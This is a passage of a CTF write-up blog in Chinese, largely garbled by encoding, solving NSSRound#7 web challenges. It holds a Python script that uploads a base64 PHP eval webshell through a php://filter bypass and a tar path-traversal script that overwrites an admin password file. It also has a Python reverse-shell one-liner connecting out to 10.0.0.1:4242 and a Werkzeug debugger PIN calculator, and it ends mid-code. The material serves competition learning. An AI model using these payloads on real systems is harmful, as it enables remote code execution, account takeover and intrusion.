class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;N0o0o0oO0o!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&quot;NoOo00O0o0!&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Noo0oO0oOo!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO0o0oO0oO!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No0o0o000O!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NO0o0o0o0o!&quot;</span>);</span><br><span class="line">&#125; NO0o0o0o0o!</span><br></pre></td></tr></table></figure><p>ËøôÈáåÁöÑÁªïËøáÁõ¥Êé•ÁúãwpËß£ÈáäÔºåÊå∫ËØ¶ÁªÜÁöÑÊáíÂæóÂÜô‰∫Ü<br><code>È¶ñÂÖàÊòØÂêÑËá™ÁªïËøáÔºåÁ¨¨‰∏ÄÂ±ÇÊï∞ÁªÑÁªïËøáÔºåNSSCTF[]=1&amp;NSSCTF[]=2ÔºåÁ¨¨‰∫åÂ±ÇÊòØin_array()Á¨¨‰∏â‰∏™ÂèÇÊï∞Ê≤°ÊúâÁõ¥Êé•strictÂØºËá¥ÂèØ‰ª•ÁªïËøáÔºåNsScTF=1qÔºåÁ¨¨‰∏âÂ±ÇÊòØ‰º™ÂçèËÆÆNsScTf=data://text/plain,Welcome to Round7!!!ÔºåÁ¨¨ÂõõÂ±Çnss_ctfer.vipÊ≥®ÊÑèÂèò‰∏∫nss[ctfer.vip(Âõ†‰∏∫PHPÂåπÈÖçÁöÑÊó∂ÂÄô‰ºöËá™Âä®Â∞Ü[.ÂèòÊàê‰∏ãÂàíÁ∫øÔºåÊúâ‰∏î‰ªÖÂèò‰∏ÄÊ¨°)ÔºåÁ¨¨‰∫îÂ±ÇÊòØintval()ÁªïËøáÔºåÂ≠óÁ¨¶‰∏≤‰ΩøÁî®ÁßëÂ≠¶ËÆ°Êï∞Ê≥ïÔºå‰ºöÈªòËÆ§ÊòØÂâçÈù¢ÁöÑÊï∞Â≠óÔºåÊØîÂ¶Ç‚Äô1e1‚ÄôËΩ¨ÂåñÂèòÊàê1ÔºåNSScTf=114514e1ÔºåÁ¨¨‰∫îÂ±ÇÁõ¥Êé•nSScTF=1Ôºå$nSscTF=NSSRound7„ÄÇËøôÈáåÁöÑÂÖ≥ÈîÆÊòØÊñá‰ª∂‰∏ä‰º†ÔºåÈÄöËøástrops()Ê£ÄÊµãÊñá‰ª∂ÁöÑÂêçÁß∞ÊòØÂê¶Â≠òÂú®pngÔºåÁõ¥Êé•ÊîπÂ¢ûÂä†pngÂç≥ÂèØÁªïËøáÔºåÂÖ≥ÈîÆÊòØ‰ºöÂ∞Ü&lt;?php die(‚ÄúRound7 do you like‚Äù);ÂÜôÂÖ•Âà∞Êñá‰ª∂‰∏≠ÔºåÊâÄ‰ª•Â∞±ÂØºËá¥‰∫Ü‰º†ÂÖ•ÁöÑËôΩÁÑ∂ÊòØphpÊñá‰ª∂Ôºå‰ΩÜÊòØ‰ºöÁªàÊ≠¢„ÄÇËøôÈáå‰πüÊòØ‰ΩøÁî®‰∏äÈù¢Âêå‰∏Ä‰∏™tipsÔºå‰ΩøÁî®ËøáÊª§Âô®‰ΩøÁî®Êñá‰ª∂ÔºåÂ¶Çphp://filter/write=convert.base64-decode/resource=aiwin.png.phpÔºåËÆ©ÂÜôÂÖ•ÂÜÖÂÆπËøõË°åbase64Ëß£Á†ÅÔºåËøôÈáåË¶Å‰ΩøÁî®URLÁºñÁ†ÅÔºåÁªïËøá/resource=aiwin.png.php‰Ωú‰∏∫Êñá‰ª∂ÂêçÔºåÁÑ∂ÂêéÂú®Êñá‰ª∂ÂÜôÂÖ•ÁöÑÂÜÖÂÆπ‰∏≠ÊûÑÈÄ†base64Ôºå‰ΩøÂæó&lt;?php die(‚ÄúRound7 do you like‚Äù);Ë¢´‰∏çÊ≠£Â∏∏Ëß£Á†ÅÔºåÈÄ†ÊàêÊ≠ª‰∫°ÁªïËøá</code><br>Ê≠ª‰∫°ÁªïËøá‰πüÊòØÂ∏∏ËßÅÁöÑÔºå‰∏ªË¶ÅÊòØurlÁºñÁ†ÅÔºå‰∏çÁÑ∂Â∞±‰ºöÈÄ†Êàêresource&#x3D;aiwin.png.php‰Ωú‰∏∫Êñá‰ª∂ÂêçÔºåÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Ëá™Â∑±Âú®Êú¨Âú∞ÂÜô‰∏Ä‰∏™‰∏ä‰º†Êñá‰ª∂ÁöÑHTMLÊù•ÊäìÂåÖÂæóÂà∞Êñá‰ª∂Á±ªÂûãÔºåÊàñËÄÖÁõ¥Êé•Áî®ÂÜôËÑöÊú¨Êù•‰∏ä‰º†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line">content = <span class="string">b&quot;&quot;&quot;aaaPD9waHAgZXZhbCgkX1JFUVVFU1RbOF0pOz8+&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28571/Ns_SCtF.php?NSSCTF[]=1&amp;NsSCTF[]=2&amp;NsScTF=1a&amp;NsScTf=data://text/plain,Welcome%20to%20Round7!!!&amp;nss[ctfer.vip=&amp;NSScTf=114514.3&amp;nSScTF=1&amp;nSscTF=NSSRound7&quot;</span></span><br><span class="line"> </span><br><span class="line">data = &#123;<span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span>&#125;</span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;%70%68%70%3a%2f%2f%66%69%6c%74%65%72%2f%63%6f%6e%76%65%72%74%2e%62%61%73%65%36%34%2d%64%65%63%6f%64%65%2f%72%65%73%6f%75%72%63%65%3d%31%31%31%2e%70%6e%67%2e%70%68%70&#x27;</span>, content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line">resp = requests.post(url, data=data, files=files)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>ËöÅÂâëËøûÊé•Âú®home‰∏ãÊâæÂà∞flag</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262157724.png" alt="image-20230226215742674"></p><p>ÂèÇËÄÉÔºö<br><a href="https://blog.csdn.net/weixin_53090346/article/details/128815454">NSSRound#7 TeamWebÂ≠¶‰π†_Aiwin-HackerÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a><br><a href="https://blog.csdn.net/qq_64201116/article/details/128922324">NSSRound#7_Ê∏ÖÈ£é‚ÄìÁöÑÂçöÂÆ¢-CSDNÂçöÂÆ¢</a><br><a href="https://www.ctfer.vip/note/set/923">NSSCTF - ÊñáÁ´† - NSSRound#7 Team ÂÆòÊñπWrite Up (ctfer.vip)</a></p><h1 id="Êñ∞ÁöÑÂçöÂÆ¢"><a href="#Êñ∞ÁöÑÂçöÂÆ¢" class="headerlink" title="Êñ∞ÁöÑÂçöÂÆ¢"></a>Êñ∞ÁöÑÂçöÂÆ¢</h1><p>Á¨¨‰∏Ä‰∏™Ë∑ØÁî±‰∏ãÂèØ‰ª•ÂæóÂà∞‰∏Ä‰∫õ‰ø°ÊÅØ</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262200347.png" alt="image-20230226220057048"></p><p>Ëß£ÂØÜ‰∏≠Èó¥ÁöÑÂ≠óÁ¨¶ÂæóÂà∞Ê∫êÁ†Å</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262158964.png" alt="image-20230226215824314"></p><p>ÊâìÂºÄÂèØ‰ª•ÁúãÂà∞Âè™Ë¶ÅadminÂèØ‰ª•ÁúãÂà∞flagÔºåËøôÈáåÂÖ∂ÂÆûÂ∞±ÊòØÂà©Áî®ÁõÆÂΩïÁ©øË∂äË¶ÜÁõñÊéâÂéüÊù•ÁöÑuserinfo.jsonÔºåÈáçÁΩÆadminÂØÜÁ†ÅÔºåÂèØ‰ª•ÂèÇËÄÉ‰∏Ä‰∏ãCVE-2007-4559ÔºåÂèØÊÄúÊàëÂΩìÊó∂Ëøò‰∏ÄÁõ¥ÊÉ≥ÁùÄ‰º™ÈÄ†session</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, hashlib, json</span><br><span class="line"> </span><br><span class="line">username = <span class="string">&#x27;Joker&#x27;</span> <span class="comment"># ‰Ω†Ê≥®ÂÜåÊó∂Áî®ÁöÑÁî®Êà∑ÂêçÔºåÂ∞ΩÈáèÂà´ÊúâÂ•áÊÄ™ÁöÑÁ¨¶Âè∑</span></span><br><span class="line">admin_passwd = <span class="string">&#x27;123456&#x27;</span> <span class="comment"># ‰πãÂêéË¶Å‰ΩøÁî®adminË¥¶Êà∑ÁôªÈôÜÊó∂ÁöÑÂØÜÁ†Å</span></span><br><span class="line"> </span><br><span class="line">os.makedirs(<span class="string">&#x27;conf&#x27;</span>)</span><br><span class="line">os.makedirs(os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>, username]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.sep.join([os.getcwd(), <span class="string">&#x27;conf&#x27;</span>, <span class="string">&#x27;userinfo.json&#x27;</span>]), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> tFile:</span><br><span class="line">    tFile.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(admin_passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">userDataDir = os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>])</span><br><span class="line">os.system(<span class="string">f&#x27;cd &quot;<span class="subst">&#123;userDataDir&#125;</span>&quot; &amp;&amp; tar cPzvf upload.tar.gz <span class="subst">&#123;username&#125;</span>/../../conf/userinfo.json&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ËøêË°å‰πãÂêé‰ºö‰∫ßÁîü‰∏Ä‰∏™upload.tar.gzÊñá‰ª∂ÔºåÁÑ∂ÂêéÁî®ËÑöÊú¨‰∏≠ÁöÑÁî®Êà∑ÂêçÂéªÊ≥®ÂÜå‰∏Ä‰∏™Ë¥¶Âè∑ÁôªÂΩïÂêé‰∏ä‰º†ÁîüÊàêÁöÑupload.tar.gzÊñá‰ª∂ÔºåÁÑ∂ÂêéÊ≥®ÈîÄÔºåÁî®adminÁôªÂΩïÂç≥ÂèØÁúãÂà∞flag</p><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201544.png" alt="image-20230226220113486"></p><h1 id="ShadowFlag"><a href="#ShadowFlag" class="headerlink" title="ShadowFlag"></a>ShadowFlag</h1><p>ÂÖàÊîæ‰ª£Á†ÅÔºå‰πãÂâçÊ≤°Êé•Ëß¶ËøáËøôÁ±ªÈ¢òÔºåËá™Â∑±ÂØπ‰∫éLinuxÁöÑÂæàÂ§ö‰∏úË•ø‰πü‰∏çÊáÇÔºåË∂ÅÊ≠§ÂèØ‰ª•Â≠¶Â≠¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">  </span><br><span class="line">flag1 = <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/flag2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    flag2 = f.read()  </span><br><span class="line">tag = <span class="literal">False</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        <span class="keyword">return</span> f.read()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/shell&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():  </span><br><span class="line">    <span class="keyword">global</span> tag  </span><br><span class="line">    <span class="keyword">if</span> tag != <span class="literal">True</span>:  </span><br><span class="line">        <span class="keyword">global</span> flag1  </span><br><span class="line">        <span class="keyword">del</span> flag1  </span><br><span class="line">        tag = <span class="literal">True</span>  </span><br><span class="line">    os.system(<span class="string">&quot;rm -f /tmp/flag1.txt /tmp/flag2.txt&quot;</span>)  </span><br><span class="line">    action = request.form[<span class="string">&quot;act&quot;</span>]  </span><br><span class="line">    <span class="keyword">if</span> action.find(<span class="string">&quot; &quot;</span>) != -<span class="number">1</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Nonono&quot;</span>  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        os.system(action)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Wow&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error_date</span>(<span class="params">error</span>):  </span><br><span class="line">    sleep(<span class="number">5</span>)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Êâ´Êâ´Êâ´ÔºåÊâ´Âï•‰∏úÊñπÊòéÁè†Âë¢[ÊÄí]&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>Áõ¥Êé•ÁúãshellË∑ØÁî±ÔºåÂèØ‰ª•Âºπ‰∏™shellÔºåËøôÈáåËøáÊª§‰∫ÜÁ©∫Ê†ºÁî®%09ÂèØ‰ª•ÁªïËøáÔºåÁÑ∂ÂêéÂéªÂ§ß‰Ω¨Êé®ËçêÁöÑÂºπshellÂ§ßÂêàÈõÜÈáåÈù¢Êâæ‰∏™pythonÊó†Á©∫Ê†ºÁöÑÂ∞±Ë°å,[ÂºπshellÂ§ßÂêàÈõÜ](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">PayloadsAllTheThings&#x2F;Reverse Shell Cheatsheet.md at master ¬∑ swisskyrepo&#x2F;PayloadsAllTheThings (github.com)</a>)<br><code>act=python%09-c%09&#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</code><br>hackbarÊâßË°åÊãøÂà∞shellÔºåÁÑ∂ÂêéËøôÈáåÊ∂âÂèäÂà∞ÊãøflagÁöÑÁ¨¨‰∏Ä‰∏™Áü•ËØÜÁÇπ</p><blockquote><p>ÂèØ‰ª•ÁúãÂà∞Á¨¨‰∏Ä‰∏™flagÊòØ‰ΩøÁî®openÊâìÂºÄÁöÑ<code>flag1 = open(&quot;/tmp/flag1.txt&quot;, &quot;r&quot;)</code>Ôºå‰ΩÜÊòØrmÂà†Èô§‰∫ÜÔºå‰ΩÜÊòØÊ≤°ÊúâÁî®close()Êù•ÂÖ≥Èó≠ÔºåËøôÊ†∑Â∞±‰ºöÈÄ†ÊàêÔºåÊñá‰ª∂ËôΩÁÑ∂Â∑≤ÁªèÂà†Èô§‰ΩÜÊòØËøõÁ®ã‰ªçÁÑ∂Â≠òÂú®ÔºåÊ≠§Êó∂Êàë‰ª¨Â∞±ÂèØ‰ª•Âú®<code>/proc/[pid]/fd</code>‰∏ãÊâæÂà∞Ëøô‰∏™Êñá‰ª∂</p></blockquote><p><img src="https://raw.githubusercontent.com/Joker2763/img/master/img202302262201726.png" alt="image-20230226220131766"></p><p>ËøôÊ†∑Â∞±ÊâæÂà∞‰∫ÜÁ¨¨‰∏ÄÊÆµflagÔºåÁÑ∂ÂêéÊâæÁ¨¨‰∫åÊÆµflagÔºåËøôÈáåÂ∞±Ê∂âÂèäÂà∞È´òÁâàÊú¨ÁöÑflask pinÂÄºËÆ°ÁÆóÔºåÂõ†‰∏∫Á¨¨‰∫å‰∏™flagÊòØÁî®withÊâìÂºÄ<code>with open(&quot;/tmp/flag2.txt&quot;, &quot;r&quot;) as f:</code>Áî®withÊâìÂºÄÁâπÁÇπÊòØ‰ΩøÁî®ÂÆåÂêéÈªòËÆ§ÂÖ≥Èó≠ÔºåÊâÄ‰ª•Â∞±Âæó‰ªéflaskÁéØÂ¢É‰∏≠ÂéªÊâæÔºåÂç≥ÁÆóÂá∫pinÂÄºÔºåÊâìÂºÄconsoleË∞ÉËØïÂéªÊâæ<br>ËÆ°ÁÆópinÂÄºÈúÄË¶ÅÂæóÂà∞‰∏ãÈù¢ËøôÂá†‰∏™Êï∞ÂÄº</p><blockquote><p>1.flaskÊâÄÁôªÂΩïÁöÑÁî®Êà∑Âêç<br>2.flaskÂ∫ì‰∏ãapp.pyÁöÑÁªùÂØπË∑ØÂæÑ<br>2.ÂΩìÂâçÁΩëÁªúÁöÑmacÂú∞ÂùÄÁöÑÂçÅËøõÂà∂Êï∞<br>2.docker_idÂíåÊú∫Âô®id</p></blockquote><p>ÊÄé‰πàÊâæÁõ¥Êé•ÂÜôÂú®ËÑöÊú¨ÈáåÈù¢‰∫ÜÔºådockerÈÇ£ÈáåÂèñÊúÄ‰∏äÈù¢ÁöÑÂÄºÂ∞±Ë°å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sha1ÁÆóÊ≥ïÔºåÈÄÇÁî®‰∫éÈ´òÁâàÊú¨flask  </span></span><br><span class="line"><span class="keyword">import</span> hashlib  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain  </span><br><span class="line">probably_public_bits = [  </span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span><span class="comment"># /etc/passwd Áî®Êà∑Âêç whoami </span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># ÈªòËÆ§ÂÄº  </span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># ÈªòËÆ§ÂÄº  </span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span> <span class="comment"># Êä•ÈîôÂæóÂà∞ app.pyÁöÑÁªùÂØπË∑ØÂæÑ  </span></span><br><span class="line">]  </span><br><span class="line">  </span><br><span class="line">private_bits = [  </span><br><span class="line">    <span class="comment"># /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;02:42:ac:02:00:f7&quot;</span>.replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>),<span class="number">16</span>)),  </span><br><span class="line"> <span class="comment">#/proc/sys/kernel/random/boot_id + docker_id ËØªÂèñÁî®/proc/self/cgroupÊàñËÄÖ/proc/1/cpuset  </span></span><br><span class="line">    <span class="string">&quot;e0ad2d31-1d21-4f57-b1c5-4a9036fbf235&quot;</span>+<span class="string">&quot;0dcbb0f159a0a2183aa148b6259b663635ea0a7ec4822b7da342ed08761bf47c&quot;</span>  </span><br><span class="line">]  </span><br><span class="line">  </span><br><span class="line">h = hashlib.sha1()  </span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:  </span><br><span class="line">        <span class="keyword">continue</span>  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):  </span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">    h.update(bit)  </span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]  </span><br><span class="line">  </span><br><span class="line">num = <span class="literal">None</span>  </span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)  </span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]  </span><br><span class="line">  </span><br><span class="line">rv =<span class="literal">None</span>  </span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:  </span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)  </span><br><span class="line">                        <span 